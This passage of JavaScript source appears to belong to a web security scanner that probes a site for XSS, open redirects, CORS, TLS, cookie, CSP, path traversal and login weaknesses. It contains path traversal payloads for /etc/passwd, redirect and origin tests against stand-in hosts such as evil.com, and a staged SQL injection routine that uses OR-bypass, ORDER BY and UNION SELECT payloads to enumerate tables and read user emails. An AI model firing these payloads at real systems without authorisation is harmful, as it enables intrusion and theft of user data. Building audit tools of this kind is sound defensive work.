            addFinding('FAIBLE', 'XSS', `XSS payload reflected (not executed) via "${param}"`, `Payload: ${payload}\nThe payload is present in the page HTML but execution was blocked (CSP, encoding, or browser protection).\nThis is informational - the server reflects user input, but the payload did NOT execute.`, 'Escape user output server-side. Never insert unfiltered content into the DOM. The current CSP or encoding appears effective, but defense-in-depth is recommended.');
            xssFound = true;
            break;
          }

          page.removeAllListeners('dialog');
        }
      }

      if (!xssFound) {
        addFinding('INFO', 'XSS', 'No reflected XSS detected', `${xssPayloads.length} payloads tested on ${testParams.length} parameters - no reflection found`, '');
      }

      await browser.close();
    } catch (err) {
      if (browser) await browser.close();
      addFinding('INFO', 'XSS', 'XSS test failed', err.message, '');
    }
  }

  // ── SCENARIO 3 : XSS Stored - form testing ──
  spinner.text = 'Detecting forms vulnerable to stored XSS...';
  {
    let browser;
    try {
      browser = await launchBrowser();
      const page = await createBrowserPage(browser, baseUrl);
      await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 15000 });

      // Find all forms
      const forms = await page.evaluate(() => {
        return [...document.querySelectorAll('form')].map((form, i) => {
          const inputs = [...form.querySelectorAll('input, textarea')].map(input => ({
            name: input.name || input.id || `input_${i}`,
            type: input.type || 'text',
            tag: input.tagName.toLowerCase(),
          }));
          return {
            action: form.action,
            method: form.method,
            inputs,
            hasTextInput: inputs.some(i => ['text', 'search', 'email', 'url', 'textarea'].includes(i.type) || i.tag === 'textarea'),
          };
        });
      });

      if (forms.length === 0) {
        addFinding('INFO', 'XSS Stored', 'No form detected on the page', '', '');
      } else {
        const storedInputForms = forms.filter(f => classifyStoredInputSurface(f));
        if (storedInputForms.length > 0) {
          const formDetails = storedInputForms.map(f =>
            `Action: ${f.action}, Method: ${f.method}, Fields: ${f.inputs.map(i => `${i.name} (${i.type})`).join(', ')}`
          ).join('\n');
          addFinding('INFO', 'XSS Stored', `${storedInputForms.length} state-changing form(s) accept free text`, `${formDetails}\nForm presence is an input surface, not proof of stored XSS.`, 'Confirm stored XSS with a harmless canary and verify that later rendering is safely escaped.');
        } else {
          addFinding('INFO', 'XSS Stored', `${forms.length} form(s) detected without a state-changing free-text surface`, '', '');
        }
      }

      await browser.close();
    } catch (err) {
      if (browser) await browser.close();
    }
  }

  // ── SCENARIO 4 : Open Redirect ──
  spinner.text = 'Open redirect test...';
  {
    const redirectParams = ['redirect', 'url', 'next', 'return', 'returnTo', 'return_to', 'callback', 'continue', 'dest', 'destination', 'go', 'target', 'rurl', 'forward'];
    const evilUrl = 'https://evil-attacker-site.com';
    let redirectFound = false;

    for (const param of redirectParams) {
      const testUrl = `${baseUrl}?${param}=${encodeURIComponent(evilUrl)}`;
      try {
        const res = await safeFetch(testUrl, { timeoutMs: 8000, redirect: 'manual', cache: 'no-store' });
        if (!res) continue;
        const location = res.headers.get('location') || '';

        // True open redirect: the Location header resolves to a different origin.
        // A relative redirect like "/fr?redirect=https://evil..." that just
        // preserves the query parameter is NOT an open redirect.
        let redirectsExternally = false;
        try {
          const resolved = new URL(location, testUrl);
          const targetOrigin = new URL(baseUrl).origin;
          redirectsExternally = resolved.origin !== targetOrigin && resolved.hostname.includes('evil-attacker-site.com');
        } catch {}
        if (redirectsExternally) {
          addFinding('CRITIQUE', 'Open Redirect', `Open redirect detected via parameter "${param}"`, `URL: ${testUrl}\nRedirects to: ${location}\nAn attacker can create a link that appears to come from your site but redirects to a phishing site.`, 'Validate redirect URLs server-side. Only allow redirections to your own domain.');
          redirectFound = true;
          break;
        }
      } catch {}
    }

    if (!redirectFound) {
      addFinding('INFO', 'Open Redirect', 'No open redirect detected', `${redirectParams.length} parameters tested - no external redirection`, '');
    }
  }

  // ── SCENARIO 5 : CORS misconfiguration ──
  spinner.text = 'CORS misconfiguration test...';
  {
    const evilOrigins = [
      'https://evil.com',
      'https://joely.io.evil.com',
      `${origin}.evil.com`,
      'null',
    ];

    for (const evilOrigin of evilOrigins) {
      const res = await safeFetch(baseUrl, {
        headers: { 'Origin': evilOrigin },
      });
      if (!res) continue;

      const acao = res.headers.get('access-control-allow-origin');
      const acac = res.headers.get('access-control-allow-credentials');

      const cors = classifyCorsPolicy({
        requestOrigin: evilOrigin,
        allowOrigin: acao,
        allowCredentials: acac,
      });
      if (cors) {
        addFinding(
          cors.severity,
          'CORS',
          cors.title,
          `${cors.detail}\nAccess-Control-Allow-Origin: ${acao}${acac ? `\nAccess-Control-Allow-Credentials: ${acac}` : ''}`,
          'Validate reflected origins against an explicit allowlist. Use wildcard CORS only for intentionally public resources.',
        );
        break;
      }
    }
  }

  // ── SCENARIO 6 : SSL/TLS ──
  spinner.text = 'SSL/TLS analysis...';
  {
    const httpsUrl = baseUrl.startsWith('https') ? baseUrl : baseUrl.replace('http://', 'https://');
    const res = await safeFetch(httpsUrl);
    if (!res) {
      addFinding('CRITIQUE', 'SSL/TLS', 'HTTPS not available', `${httpsUrl} does not respond over HTTPS`, 'Enable HTTPS with an SSL certificate (Let\'s Encrypt)');
    } else {
      // Check if HTTP is accessible without redirection
      const httpUrl = httpsUrl.replace('https://', 'http://');
      try {
        const httpRes = await safeFetch(httpUrl, { timeoutMs: 8000, redirect: 'manual', cache: 'no-store' });
        if (!httpRes) throw new Error('http_unreachable');

        if (httpRes.status >= 200 && httpRes.status < 300) {
          addFinding('ELEVEE', 'SSL/TLS', 'Site accessible over HTTP without redirection', `${httpUrl} responds with status ${httpRes.status} instead of redirecting to HTTPS`, 'Configure a permanent 301 redirect from HTTP to HTTPS in nginx');
        }
      } catch {}

      // Check HSTS preload
      const hsts = res.headers.get('strict-transport-security') || '';
      if (hsts) {
        if (!hsts.includes('includeSubDomains')) {
          addFinding('MOYENNE', 'SSL/TLS', 'HSTS without includeSubDomains', `HSTS: ${hsts}`, 'Add includeSubDomains to protect subdomains');
        }
        if (!hsts.includes('preload')) {
          addFinding('FAIBLE', 'SSL/TLS', 'HSTS without preload', `HSTS: ${hsts}`, 'Add preload and submit the domain on hstspreload.org for maximum protection');
        }
        const maxAgeMatch = hsts.match(/max-age=(\d+)/);
        if (maxAgeMatch && parseInt(maxAgeMatch[1]) < 31536000) {
          addFinding('MOYENNE', 'SSL/TLS', 'HSTS max-age too short', `max-age=${maxAgeMatch[1]} (${Math.floor(parseInt(maxAgeMatch[1])/86400)} days). Recommended: 31536000 (1 year)`, 'Increase max-age to at least 31536000');
        }
      }
    }
  }

  // ── SCENARIO 7 : Cookie stealing simulation ──
  spinner.text = 'Analyzing cookies vulnerable to theft...';
  {
    let browser;
    try {
      browser = await launchBrowser();
      const page = await createBrowserPage(browser, baseUrl);
      await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 15000 });

      const cookies = await page.cookies();

      if (cookies.length === 0) {
        addFinding('INFO', 'Cookie Security', 'No cookies detected', '', '');
      } else {
        for (const cookie of cookies) {
          const issues = [];
          if (!cookie.httpOnly) issues.push('no HttpOnly (accessible via document.cookie - stealable by XSS)');
          if (!cookie.secure) issues.push('no Secure (sent in plain HTTP - interceptable)');
          if (cookie.sameSite === 'None' || !cookie.sameSite) issues.push(`SameSite=${cookie.sameSite || 'not set'} (vulnerable to CSRF)`);

          // Sensitive cookies (session, auth, token)
          const isSensitive = /session|token|auth|jwt|sid|csrf|supabase/i.test(cookie.name);

          if (issues.length > 0) {
            const sev = isSensitive ? 'CRITIQUE' : 'MOYENNE';
            addFinding(sev, 'Cookie Security', `Cookie "${cookie.name}" vulnerable${isSensitive ? ' (SENSITIVE COOKIE)' : ''}`, `Domain: ${cookie.domain}\nIssues: ${issues.join(', ')}\nCookie value omitted from evidence.${isSensitive ? '\nThis cookie appears to be related to authentication, so theft could allow session hijacking.' : ''}`, `Add missing flags: ${!cookie.httpOnly ? 'HttpOnly ' : ''}${!cookie.secure ? 'Secure ' : ''}${!cookie.sameSite ? 'SameSite=Strict' : ''}`);
          }
        }
      }

      await browser.close();
    } catch (err) {
      if (browser) await browser.close();
    }
  }

  // ── SCENARIO 8 : CSP Bypass analysis ──
  spinner.text = 'Content-Security-Policy analysis...';
  {
    const res = await safeFetch(baseUrl);
    if (res) {
      let csp = res.headers.get('content-security-policy') || '';
      if (!csp) {
        // Check for CSP via meta tag before reporting CRITIQUE
        const cspBody = await res.text();
        const metaCspMatch = cspBody.match(/<meta\s+http-equiv\s*=\s*["']Content-Security-Policy["'][^>]*content\s*=\s*["']([^"']+)["']/i);
        if (metaCspMatch) {
          csp = metaCspMatch[1];
          addFinding('FAIBLE', 'CSP', 'CSP defined via meta tag only', `Content-Security-Policy is set via <meta> tag: "${csp.substring(0, 120)}..."\nMeta tag CSP has limitations: cannot set frame-ancestors, report-uri, or sandbox directives.`, 'Move CSP to an HTTP response header for full protection');
        }
      }
      if (!csp) {
        addFinding(classifyHardeningSignal('missing-csp').severity, 'CSP', 'No Content-Security-Policy', 'CSP is a defense-in-depth control that limits the impact of an existing injection flaw. Its absence does not prove that script injection is possible.', 'Add a strict CSP. Minimal example:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' data:; connect-src \'self\' https://*.supabase.co');
      } else {
        // Analyze CSP weaknesses
        if (csp.includes('unsafe-inline') && csp.includes('script-src')) {
          addFinding('ELEVEE', 'CSP', 'CSP with unsafe-inline on script-src', `CSP: ${csp}\nunsafe-inline allows inline script execution - cancels CSP anti-XSS protection`, 'Remove unsafe-inline from script-src. Use nonces or hashes instead.');
        }
        if (csp.includes('unsafe-eval')) {
          addFinding('ELEVEE', 'CSP', 'CSP with unsafe-eval', `CSP: ${csp}\nunsafe-eval allows eval() and new Function() - injection vector`, 'Remove unsafe-eval. Refactor code that uses eval().');
        }
        if (csp.includes('*') && !csp.includes('*.supabase')) {
          addFinding('ELEVEE', 'CSP', 'CSP with wildcard (*)', `CSP: ${csp}\nThe wildcard allows loading from any domain`, 'Replace wildcards with specific domains.');
        }
        if (csp.includes('data:') && csp.includes('script-src')) {
          addFinding('MOYENNE', 'CSP', 'CSP allows data: in script-src', `Allows executing scripts via data: URIs`, 'Remove data: from script-src');
        }
      }
    }
  }

  // ── SCENARIO 9 : Path Traversal ──
  spinner.text = 'Path traversal test...';
  {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\etc\\passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
    ];

    let traversalFound = false;
    for (const payload of traversalPayloads) {
      const testUrl = `${baseUrl}/${payload}`;
      const res = await safeFetch(testUrl);
      if (!res) continue;
      const body = await res.text();

      if (body.includes('root:') && body.includes('/bin/')) {
        addFinding('CRITIQUE', 'Path Traversal', 'Path traversal detected - /etc/passwd read', `URL: ${testUrl}\nThe server returns the contents of system files`, 'Validate and normalize all file paths server-side. Never construct a file path from user input.');
        traversalFound = true;
        break;
      }
    }

    if (!traversalFound) {
      addFinding('INFO', 'Path Traversal', 'No path traversal detected', `${traversalPayloads.length} payloads tested`, '');
    }
  }

  // ── SCENARIO 10 : HTTP Method testing ──
  spinner.text = 'Testing dangerous HTTP methods...';
  {
    const dangerousMethods = ['TRACE', 'OPTIONS'];

    for (const method of dangerousMethods) {
      const traceCanary = method === 'TRACE' ? 'vice-trace-probe-2026' : '';
      const res = await safeFetch(baseUrl, {
        method,
        ...(traceCanary ? { headers: { 'X-Vice-Trace-Canary': traceCanary } } : {}),
      });
      if (!res) continue;

      let methodBody = '';
      try { methodBody = await res.text(); } catch {}
      if (method === 'TRACE') {
        const trace = classifyTraceResponse(res.status, methodBody, traceCanary);
        if (trace) addFinding(trace.severity, 'HTTP Methods', 'TRACE reflects request data', `The TRACE response reflected the unique audit header on ${baseUrl}.`, 'Disable TRACE in the web server configuration.', { classification: trace.classification, confidence: trace.confidence, rule_id: 'vice/http/trace-reflection' });
        continue;
      }
      if (method === 'OPTIONS') {
        const advertised = `${res.headers.get('allow') || ''},${res.headers.get('access-control-allow-methods') || ''}`
          .split(',')
          .map(value => value.trim().toUpperCase())
          .filter(value => ['POST', 'PUT', 'PATCH', 'DELETE'].includes(value));
        if (advertised.length > 0) {
          addFinding('INFO', 'HTTP Methods', 'State-changing methods advertised', `OPTIONS advertises: ${[...new Set(advertised)].join(', ')}. The audit did not invoke these methods.`, 'Confirm that every state-changing route requires authorization.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/http/advertised-mutations' });
        }
      }
    }
  }
}

// ──────────── MODULE 9 : Login Audit & User Protection ────────────

async function auditLoginSecurity(baseUrl, spinner) {
  let browser;
  try {
    browser = await launchBrowser();
  } catch (err) {
    addFinding('INFO', 'Login Audit', 'Unable to launch browser', err.message, '');
    return;
  }

  const page = await createBrowserPage(browser, baseUrl);

  // ── DETECT : Find the login page ──
  spinner.text = 'Searching for login page...';
  const loginPaths = ['/login', '/auth/login', '/signin', '/auth/signin', '/sign-in', '/auth/sign-in', '/connexion', '/auth', '/account/login', '/user/login'];
  let loginUrl = null;

  // If the given URL is already a login page, use it
  if (/login|signin|sign-in|auth|connexion/i.test(baseUrl)) {
    loginUrl = baseUrl;
  } else {
    for (const path of loginPaths) {
      const testUrl = new URL(baseUrl).origin + path;
      const res = await safeFetch(testUrl);
      if (res && res.status === 200) {
        const body = await res.text();
        if (/password|mot de passe|login|connexion|sign.?in/i.test(body)) {
          loginUrl = testUrl;
          break;
        }
      }
    }
  }

  if (!loginUrl) {
    addFinding('INFO', 'Login Audit', 'No local login form found', `No local credential form was detected on ${baseUrl}. Federated or externally hosted authentication may still be present.`, 'Audit custom or external authentication entry points separately.');
    await browser.close();
    return;
  }

  addFinding('INFO', 'Login Audit', `Login page found: ${loginUrl}`, '', '');

  // Load the login page
  await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 15000 });
  await new Promise(r => setTimeout(r, 2000));

  // ── CHECK 1 : Form GET vs POST ──
  spinner.text = 'Checking form method...';
  const formInfo = await page.evaluate(() => {
    const forms = [...document.querySelectorAll('form')];
    const loginForm = forms.find(f => {
      const inputs = [...f.querySelectorAll('input')];
      return inputs.some(i => i.type === 'password');
    });
    if (!loginForm) return null;

    const inputs = [...loginForm.querySelectorAll('input, button, textarea')].map(el => ({
      tag: el.tagName.toLowerCase(),
      type: el.type || '',
      name: el.name || el.id || '',
      autocomplete: el.getAttribute('autocomplete') || '',
      placeholder: el.placeholder || '',
    }));

    return {
      method: loginForm.method?.toUpperCase() || 'GET',
      action: loginForm.action || '',
      hasCSRF: inputs.some(i => /csrf|token|_token|nonce/i.test(i.name)),
      inputs,
      hasPasswordInput: inputs.some(i => i.type === 'password'),
      hasEmailInput: inputs.some(i => i.type === 'email' || /email|mail/i.test(i.name)),
      autocompleteForm: loginForm.getAttribute('autocomplete') || '',
    };
  });

  if (!formInfo) {
    addFinding('INFO', 'Login Audit', 'No login form with password field detected', '', '');
    await browser.close();
    return;
  }

  // GET method
  if (formInfo.method === 'GET') {
    addFinding('CRITIQUE', 'Login Audit', 'Login form uses GET method', `The password is sent in the URL!\nAction: ${formInfo.action}\nMethod: GET\nConsequences:\n- The password appears in the address bar\n- It is saved in browser history\n- It is visible in web server logs\n- It can be captured by proxies and browser extensions`, 'Change the form method to POST. NEVER send passwords via GET.');
  } else {
    addFinding('INFO', 'Login Audit', 'Form uses POST method', 'The password is not sent in the URL - correct', '');
  }

  // ── CHECK 2 : CSRF Token ──
  spinner.text = 'Checking CSRF protection...';
  const csrf = classifyCsrfEvidence(formInfo);
  if (csrf) {
    addFinding(
      csrf.severity,
      'Login Audit',
      csrf.title,
      `${csrf.detail}\nInputs found: ${formInfo.inputs.map(i => `${i.name} (${i.type})`).join(', ')}`,
      csrf.severity === 'FAIBLE' ? 'Verify SameSite cookies and server-side Origin or Referer validation.' : '',
    );
  }

  // ── CHECK 3 : HTTPS on the form ──
  if (formInfo.action && formInfo.action.startsWith('http://')) {
    addFinding('CRITIQUE', 'Login Audit', 'Login form submitted over HTTP (not HTTPS)', `Action: ${formInfo.action}\nThe password is sent in cleartext over the network - interceptable by anyone on the same WiFi`, 'Change the form action to HTTPS');
  }

  addFinding('INFO', 'Login Audit', 'Active login submissions skipped', 'The audit inspected the form without submitting credentials, reset requests, or injection payloads.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/login/non-destructive-mode' });
  await browser.close();
  return;

  // ── CHECK 5 : Brute force - rate limiting ──
  spinner.text = 'Testing rate limiting on login (5 attempts)...';
  {
    const fakeCredentials = Array.from({ length: 5 }, (_, index) => ({
      email: 'brute-probe@vice-audit.test',
      password: `wrong-${index + 1}`,
    }));

    let blocked = false;
    const statuses = [];
    const rateSamples = [];

    for (const cred of fakeCredentials) {
      // Reload the page for each attempt
      await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
      await new Promise(r => setTimeout(r, 1000));

      // Intercept the submit response
      let responseStatus = null;
      let responseBody = '';
      page.on('response', async (res) => {
        if (res.url().includes('login') || res.url().includes('signin') || res.url().includes('auth') || res.url().includes('token')) {
          responseStatus = res.status();
          try { responseBody = await res.text(); } catch {}
        }
      });

      // Fill in and submit
      try {
        const emailSelector = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
        const passSelector = formInfo.inputs.find(i => i.type === 'password');

        if (emailSelector && passSelector) {
          const emailSel = emailSelector.name ? `[name="${emailSelector.name}"]` : `input[type="email"]`;
          const passSel = passSelector.name ? `[name="${passSelector.name}"]` : `input[type="password"]`;

          await page.click(emailSel).catch(() => {});
          await page.type(emailSel, cred.email, { delay: 30 });
          await page.click(passSel).catch(() => {});
          await page.type(passSel, cred.password, { delay: 30 });

          await Promise.all([
            page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
            page.keyboard.press('Enter'),
          ]);

          await new Promise(r => setTimeout(r, 1500));
        }
      } catch {}

      // Check if we were blocked
      const pageContent = await page.content();
      const rateSample = { status: responseStatus, body: `${pageContent}\n${responseBody}` };
      rateSamples.push(rateSample);
      const rateEvidence = classifyRateLimitEvidence(rateSamples);
      if (rateEvidence.state === 'enforced') {
        blocked = true;
        statuses.push(`${cred.email}: BLOCKED (${responseStatus || 'captcha/message'})`);
        break;
      }
      statuses.push(`${cred.email}: ${responseStatus || 'submitted'}`);
      page.removeAllListeners('response');
    }

    const rateEvidence = classifyRateLimitEvidence(rateSamples);
    if (!blocked) {
      addFinding('INFO', 'Login Audit', 'Login rate limiting not confirmed', `5 failed attempts against the same synthetic identity did not trigger a visible block.\nResults: ${statuses.join(', ')}\nThis short probe cannot prove that no higher-threshold, account-aware, IP-based, or upstream limit exists.`, 'Review server-side rate-limit telemetry and test the configured threshold in a controlled environment.', { classification: 'heuristic', confidence: 'low' });
    } else {
      addFinding('INFO', 'Login Audit', 'Rate limiting active on login', `Blocked after ${rateEvidence.attempt || statuses.length} attempt(s)\n${statuses.join('\n')}`, '');
    }
  }

  // ── CHECK 6 : User enumeration ──
  spinner.text = 'Testing user enumeration...';
  {
    await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
    await new Promise(r => setTimeout(r, 1500));

    // Attempt a login with an email that probably does not exist
    let fakeResponse = '';
    try {
      const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
      const passSel = formInfo.inputs.find(i => i.type === 'password');

      if (emailSel && passSel) {
        const eS = emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]';
        const pS = passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]';

        await page.click(eS).catch(() => {});
        await page.type(eS, 'nonexistent-user-vice-audit@test.local', { delay: 30 });
        await page.click(pS).catch(() => {});
        await page.type(pS, 'WrongPassword123!', { delay: 30 });

        await Promise.all([
          page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
          page.keyboard.press('Enter'),
        ]);
        await new Promise(r => setTimeout(r, 2000));

        fakeResponse = await page.evaluate(() => document.body.innerText);
      }
    } catch {}

    // Now try with a common email format (admin@domain)
    await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
    await new Promise(r => setTimeout(r, 1500));

    let realResponse = '';
    try {
      const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
      const passSel = formInfo.inputs.find(i => i.type === 'password');

      if (emailSel && passSel) {
        const eS = emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]';
        const pS = passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]';

        const domain = new URL(baseUrl).hostname;
        await page.click(eS).catch(() => {});
        await page.type(eS, `admin@${domain}`, { delay: 30 });
        await page.click(pS).catch(() => {});
        await page.type(pS, 'WrongPassword123!', { delay: 30 });

        await Promise.all([
          page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
          page.keyboard.press('Enter'),
        ]);
        await new Promise(r => setTimeout(r, 2000));

        realResponse = await page.evaluate(() => document.body.innerText);
      }
    } catch {}

    // Compare error messages
    if (fakeResponse && realResponse && fakeResponse !== realResponse) {
      // Look for differences that reveal whether an account exists
      const fakeHasUserNotFound = /not found|n'existe pas|no account|introuvable|unknown|user not/i.test(fakeResponse);
      const realHasWrongPassword = /wrong password|mot de passe incorrect|invalid password|mauvais mot de passe/i.test(realResponse);

      if (fakeHasUserNotFound || realHasWrongPassword) {
        addFinding('ELEVEE', 'Login Audit', 'User enumeration possible', `Error messages differ depending on whether the email exists or not.\nNon-existent email: "${fakeResponse.substring(0, 200)}"\nPotential email (admin@): "${realResponse.substring(0, 200)}"\nAn attacker can determine which emails are registered.`, 'Use an identical generic error message in both cases: "Invalid email or password"');
      }
    }

    // Check if a generic message is used
    if (fakeResponse) {
      const isGeneric = /invalid credentials|identifiants incorrects|email ou mot de passe|invalid email or password|email or password/i.test(fakeResponse);
      if (isGeneric) {
        addFinding('INFO', 'Login Audit', 'Generic error message used', 'The message does not reveal whether the email exists or not - good sign', '');
      }
    }
  }

  // ── CHECK 7 : Login over HTTPS ──
  spinner.text = 'Verifying login is over HTTPS...';
  if (loginUrl.startsWith('http://')) {
    addFinding('CRITIQUE', 'Login Audit', 'Login page accessible over HTTP', `${loginUrl} does not use HTTPS.\nCredentials are transmitted in cleartext over the network.`, 'Force HTTPS on all authentication pages.');
  }

  // ── CHECK 8 : In-depth SQL injection on login ──
  spinner.text = 'Testing SQL injection on login...';
  {
    const emailSel = formInfo.inputs.find(i => i.type === 'email' || /email|mail|user/i.test(i.name));
    const passSel = formInfo.inputs.find(i => i.type === 'password');
    const eS = emailSel ? (emailSel.name ? `[name="${emailSel.name}"]` : 'input[type="email"]') : null;
    const pS = passSel ? (passSel.name ? `[name="${passSel.name}"]` : 'input[type="password"]') : null;

    // Utility function to submit a payload and read the response
    async function submitPayload(payload, field = 'email') {
      await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 10000 });
      await new Promise(r => setTimeout(r, 1000));

      let responseText = '';
      const responseHandler = async (res) => {
        const url = res.url();
        if (/login|auth|token|session|api/i.test(url)) {
          try { responseText = await res.text(); } catch {}
        }
      };
      page.on('response', responseHandler);

      try {
        if (eS && pS) {
          const emailVal = field === 'email' ? payload : 'test@test.com';
          const passVal = field === 'password' ? payload : 'testpass123';

          await page.click(eS).catch(() => {});
          await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, eS);
          await page.type(eS, emailVal, { delay: 15 });
          await page.click(pS).catch(() => {});
          await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, pS);
          await page.type(pS, passVal, { delay: 15 });

          await Promise.all([
            page.waitForNavigation({ timeout: 5000 }).catch(() => {}),
            page.keyboard.press('Enter'),
          ]);
          await new Promise(r => setTimeout(r, 2000));
        }
      } catch {}

      page.removeAllListeners('response');
      const pageContent = await page.content();
      const currentUrl = page.url();
      return { responseText, pageContent, currentUrl };
    }

    if (eS && pS) {
      // ── PHASE 1 : Injection detection ──
      spinner.text = 'SQL Injection - Phase 1: Detection...';
      let sqlVulnerable = false;
      let dbType = 'unknown';

      const detectionPayloads = [
        { payload: "' OR '1'='1", name: 'OR bypass' },
        { payload: "' OR '1'='1' --", name: 'OR bypass with comment' },
        { payload: "admin'--", name: 'Comment injection' },
        { payload: "1' AND '1'='2", name: 'AND false test' },
        { payload: "' OR 1=1--", name: 'Numeric OR' },
        { payload: "\\' OR \\'1\\'=\\'1", name: 'Escaped quotes' },
      ];

      for (const { payload, name } of detectionPayloads) {
        const result = await submitPayload(payload);

        // Login bypass detection
        if (!result.currentUrl.includes('login') && !result.currentUrl.includes('signin') && !result.currentUrl.includes('auth') && result.currentUrl !== loginUrl) {
          addFinding('CRITIQUE', 'SQL Injection', 'LOGIN BYPASSED VIA SQL INJECTION', `Payload: ${payload} (${name})\nRedirected to: ${result.currentUrl}\nAn attacker can log in without knowing any password.`, 'ABSOLUTE URGENCY: Use prepared statements / ORM. NEVER concatenate inputs into SQL queries.');
          sqlVulnerable = true;
          break;
        }

        // Exposed SQL error
        const combined = result.responseText + result.pageContent;
        // Match actual SQL error output, not just tech-stack mentions of the DB name
        if (/(?:pq:\s+ERROR|ERROR:.*?at character\s+\d+|LINE\s+\d+:\s|unterminated quoted string at or near|relation\s+"[^"]+"\s+does not exist|column\s+"[^"]+"\s+does not exist|syntax error at or near\s+")/i.test(combined)) { dbType = 'postgresql'; sqlVulnerable = true; }
        else if (/(?:You have an error in your SQL syntax|Warning:\s+mysqli?_|near\s+'[^']*'\s+at line\s+\d+|Unknown column\s+'[^']+'|MySQLSyntaxErrorException|MariaDB server version)/i.test(combined)) { dbType = 'mysql'; sqlVulnerable = true; }
        else if (/(?:sqlite3?\.OperationalError|near\s+"[^"]+":\s+syntax error|unrecognized token:|no such table:|no such column:)/i.test(combined)) { dbType = 'sqlite'; sqlVulnerable = true; }
        else if (/ORA-\d{5}/i.test(combined)) { dbType = 'oracle'; sqlVulnerable = true; }
        else if (/(?:sql server|mssql|microsoft (?:sql|ole db|odbc)|sqlclient|system\.data\.sqlclient)/i.test(combined)) { dbType = 'mssql'; sqlVulnerable = true; }
        else if (/(?:unterminated quoted string|unclosed quotation mark|syntax error\s+(?:near|at line|at end of input)|SQL syntax;\s+check the manual|SQLSTATE\[\d+\])/i.test(combined)) { sqlVulnerable = true; }

        if (sqlVulnerable) {
          addFinding('CRITIQUE', 'SQL Injection', `SQL injection confirmed - database: ${dbType}`, `Payload: ${payload} (${name})\nThe server exposes an SQL error. The detected DB type allows crafting specific payloads.`, 'Use prepared statements. Disable error display in production.');
          break;
        }
      }

      if (!sqlVulnerable) {
        addFinding('INFO', 'SQL Injection', 'No SQL injection detected in phase 1', `${detectionPayloads.length} payloads tested - no SQL error`, '');
      }

      // ── PHASE 2 : Table enumeration (if vulnerable) ──
      if (sqlVulnerable) {
        spinner.text = 'SQL Injection - Phase 2: Table enumeration (read-only)...';

        // Determine the number of columns with ORDER BY
        let numColumns = 0;
        for (let i = 1; i <= 20; i++) {
          const result = await submitPayload(`' ORDER BY ${i}--`);
          const combined = result.responseText + result.pageContent;
          if (/order|column|unknown|invalid|error|range/i.test(combined) && !/order by ${i}/i.test(combined)) {
            numColumns = i - 1;
            break;
          }
        }

        if (numColumns > 0) {
          addFinding('CRITIQUE', 'SQL Injection', `Number of columns in the query: ${numColumns}`, `Detected via ORDER BY. This allows building UNION SELECT statements to extract data.`, '');
        }

        // Try UNION SELECT to read tables
        const tableEnumPayloads = {
          postgresql: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "string_agg(table_name,',')" : 'NULL').join(',') : "string_agg(table_name,',')"} FROM information_schema.tables WHERE table_schema='public'--`,
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "table_name" : 'NULL').join(',') : 'table_name'} FROM information_schema.tables WHERE table_schema='public' LIMIT 1--`,
          ],
          mysql: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(table_name)" : 'NULL').join(',') : "GROUP_CONCAT(table_name)"} FROM information_schema.tables WHERE table_schema=database()--`,
          ],
          sqlite: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(name)" : 'NULL').join(',') : "GROUP_CONCAT(name)"} FROM sqlite_master WHERE type='table'--`,
          ],
          unknown: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "table_name" : 'NULL').join(',') : 'table_name'} FROM information_schema.tables--`,
          ],
        };

        const payloadsToTry = tableEnumPayloads[dbType] || tableEnumPayloads.unknown;

        for (const payload of payloadsToTry) {
          const result = await submitPayload(payload);
          const combined = result.responseText + result.pageContent;

          // Look for table names in the response
          const tablePatterns = /\b(users|accounts|profiles|sessions|tokens|orders|products|payments|invoices|clients|workspaces|members|subscriptions|emails|passwords|admins|roles|permissions)\b/gi;
          const tablesFound = combined.match(tablePatterns);

          if (tablesFound) {
            const uniqueTables = [...new Set(tablesFound.map(t => t.toLowerCase()))];
            addFinding('CRITIQUE', 'SQL Injection', `Database tables extracted via UNION`, `Payload: ${payload}\nTables found: ${uniqueTables.join(', ')}\nAn attacker can now read the contents of each table.`, 'URGENCY: Fix the SQL injection immediately. All database data is potentially compromised.');
            break;
          }
        }

        // ── PHASE 3 : Attempt to read users ──
        spinner.text = 'SQL Injection - Phase 3: Attempting to read users...';

        const userReadPayloads = {
          postgresql: [
            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : (i === 1 ? "role" : 'NULL')).join(',') : 'email'} FROM users LIMIT 5--`,
